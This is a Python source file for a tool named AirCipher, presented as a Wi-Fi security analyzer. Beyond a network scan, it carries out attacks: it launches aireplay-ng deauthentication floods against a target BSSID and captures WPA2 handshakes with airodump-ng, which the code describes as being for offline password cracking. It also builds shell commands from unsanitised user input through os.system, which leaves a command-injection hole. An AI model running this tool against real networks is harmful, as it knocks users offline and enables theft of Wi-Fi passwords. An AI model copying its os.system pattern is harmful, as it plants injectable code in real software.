import argparse
import os
import csv
from scapy.all import *

def scan_networks(interface="wlan0"):
    """Scans and displays nearby Wi-Fi networks."""
    print("Scanning for Wi-Fi networks...")
    os.system(f"iwlist {interface} scanning | grep -E 'ESSID|Encryption|Address'")

def detect_weak_encryption():
    """Detects weak encryption protocols like WEP and open networks."""
    print("Checking for weak encryption...")
    # This will be implemented to analyze scan results

def deauth_attack(target_bssid, interface="wlan0"):
    """Performs deauthentication attack."""
    print(f"Launching deauth attack on {target_bssid}...")
    os.system(f"aireplay-ng --deauth 10 -a {target_bssid} {interface}")

def capture_handshake(target_bssid, interface="wlan0"):
    """Captures WPA2 handshake for offline password cracking."""
    print(f"Capturing WPA2 handshake from {target_bssid}...")
    os.system(f"airodump-ng --bssid {target_bssid} -w reports/handshake {interface}")

def generate_report():
    """Generates a report summarizing vulnerabilities and attack results."""
    report_dir = "reports"
    os.makedirs(report_dir, exist_ok=True)
    report_file = os.path.join(report_dir, "report.csv")
    
    print("Generating report...")
    with open(report_file, mode='w', newline='') as file:
        writer = csv.writer(file)
        writer.writerow(["Test Type", "Details"])
        writer.writerow(["Wi-Fi Scan", "Results saved in terminal output"])
        writer.writerow(["Weak Encryption Detection", "Feature under development"])
        writer.writerow(["Deauth Attack", "Performed, check logs"])
        writer.writerow(["WPA2 Handshake Capture", "Saved in reports/handshake*"])
    
    print(f"Report saved in {report_file}")

def main():
    parser = argparse.ArgumentParser(description="AirCipher - Wi-Fi Security Analyzer Tool")
    parser.add_argument("mode", choices=["scan", "detect", "deauth", "handshake", "report"], help="Choose operation mode")
    parser.add_argument("--bssid", help="Target BSSID (for deauth/handshake)")
    parser.add_argument("--interface", default="wlan0", help="Network interface (default: wlan0)")
    
    args = parser.parse_args()
    
    if args.mode == "scan":
        scan_networks(args.interface)
    elif args.mode == "detect":
        detect_weak_encryption()
    elif args.mode == "deauth":
        if args.bssid:
            deauth_attack(args.bssid, args.interface)
        else:
            print("Error: BSSID required for deauth attack.")
    elif args.mode == "handshake":
        if args.bssid:
            capture_handshake(args.bssid, args.interface)
        else:
            print("Error: BSSID required for handshake capture.")
    elif args.mode == "report":
        generate_report()
    else:
        print("Invalid mode selected.")

if __name__ == "__main__":
    main()
